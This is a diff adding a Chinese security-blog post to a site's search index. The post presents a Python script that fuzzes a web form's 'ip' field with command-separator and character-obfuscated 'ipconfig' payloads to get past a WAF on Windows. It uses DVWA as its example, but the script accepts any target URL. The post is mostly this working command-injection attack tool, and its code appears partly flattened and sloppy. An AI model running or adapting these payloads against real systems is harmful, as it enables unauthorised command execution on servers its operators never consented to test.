@@ -3,6 +3,21 @@
   
     
     <entry>
+      <title>命令执行的时候绕过waf</title>
+      <link href="/2018/10/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%97%B6%E5%80%99%E7%BB%95%E8%BF%87waf/"/>
+      <url>/2018/10/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%97%B6%E5%80%99%E7%BB%95%E8%BF%87waf/</url>
+      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>国庆第五天假期，才写了三篇博客。感觉有点不理想= =，这次写的是bypass命令执行，针对目标系统是windows的。<br><img src="http://img0.imgtn.bdimg.com/it/u=3304268035,1959556107&amp;fm=200&amp;gp=0.jpg" alt=""></p><p>音乐：<embed src="//music.163.com/style/swf/widget.swf?sid=451113443&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>思路：</p><pre><code>使用一些符号来对命令进行链接执行指定命令，通过从网页上获取指定关键字判断是否成功bypass</code></pre><p>代码：</p><pre><code>#这里只是拿DVWA做个例子#import requestsimport optparsedef main():    parser=optparse.OptionParser()    parser.add_option(&apos;-u&apos;,dest=&apos;zru&apos;,help=&apos;Used for fuzzy testing&apos;)    (options,args)=parser.parse_args()    if options.zru:        url=options.zru        fuzz(url)    else:        parser.print_help()        exit()def fuzz(url):cookies=&apos;PHPSESSID=70mpunbrle3mb6bfaiqieqf3p3;security=high&apos;cookie = {}for k in str(cookies).strip().split(&apos;;&apos;):    key, value = k.split(&apos;=&apos;, 1)    cookie[key] = valueurls=urlheaders={&apos;user-aegnt&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&apos;}payload=[&apos;|&apos;,&apos;;&apos;,&apos;||&apos;,&apos;&amp;&amp;&apos;,&apos;&amp;&apos;]payload_b=[&apos;-&apos;,&apos;$&apos;]payload_c=[&apos;-&apos;]payload_d=[&apos;$&apos;]for p in payload:    for pb in payload_b:        for pc in payload_c:            for pd in payload_d:                pf=pc+pd                datas={&apos;ip&apos;:&apos;127.0.0.1{}i{}p{}c{}o{}n{}f{}i{}g&apos;.format(p,pb,pb,pb,pb,pb,pb,pb),&apos;Submit&apos;:&apos;Submit&apos;}                datas2={&apos;ip&apos;: &apos;127.0.0.1{}i{}p{}c{}o{}n{}f{}i{}g&apos;.format(p, pf, pf, pf, pf, pf, pf, pf),&apos;Submit&apos;: &apos;Submit&apos;}                reqt=requests.post(url=urls,headers=headers,cookies=cookie,data=datas)                reqt2=requests.post(url=urls,headers=headers,cookies=cookie,data=datas2)                if &apos;Windows IP&apos; in reqt.text:                    print(&apos;[+] Bypass success URL:{} data:{}&apos;.format(reqt.url,datas))                if &apos;Windows IP&apos; in reqt2.text:                    print(&apos;[+] Bypass success URL:{} data:{}&apos;.format(reqt.url, datas))if __name__ == &apos;__main__&apos;:    main()</code></pre><p>测试：<br><img src="https://s1.ax1x.com/2018/10/05/i88M40.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/10/05/i883gU.png" alt=""></p><p>转载请注明转自<a href="mailto:422926799@qq.com" target="_blank" rel="noopener">422926799@qq.com</a></p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> Writing </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>打造端口转发脚本</title>
       <link href="/2018/10/03/%E6%89%93%E9%80%A0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E8%84%9A%E6%9C%AC/"/>
       <url>/2018/10/03/%E6%89%93%E9%80%A0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E8%84%9A%E6%9C%AC/</url>
